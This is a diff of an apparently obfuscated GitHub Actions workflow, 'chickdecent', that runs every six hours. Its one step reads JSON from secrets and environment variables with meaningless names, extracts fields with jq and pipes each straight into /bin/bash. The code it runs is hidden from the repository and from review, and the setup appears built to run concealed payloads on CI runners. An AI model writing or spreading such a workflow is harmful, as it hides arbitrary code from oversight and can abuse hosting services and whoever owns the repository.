@@ -1,20 +1,25 @@
 name: chickdecent
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
+    - cron: '15 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chickdecent
         env:
-          ru0: ${{ secrets.ru0 }}
+          crcdv0: ${{ secrets.crcdv0 }}
         run: |
-          echo $ru0 | jq -r .r2439 | /bin/bash
-          echo $u8 | jq -r .ikwyj8563 | /bin/bash
-          echo $b860 | jq -r .zoyq0 | /bin/bash
-          echo $b61 | jq -r .zc700 | /bin/bash
-          echo $vixmg1809 | jq -r .ghan74190 | /bin/bash
+          echo $crcdv0 | jq -r .o96 | /bin/bash
+          echo $au739 | jq -r .yn49 | /bin/bash
+          echo $zuhro20109 | jq -r .ph7 | /bin/bash
+          echo $kzt48744 | jq -r .bryal27 | /bin/bash
+          echo $ev69 | jq -r .c42284 | /bin/bash
+          echo $r020 | jq -r .h79496 | /bin/bash
+          echo $vbwk671 | jq -r .jvxvn4 | /bin/bash
 
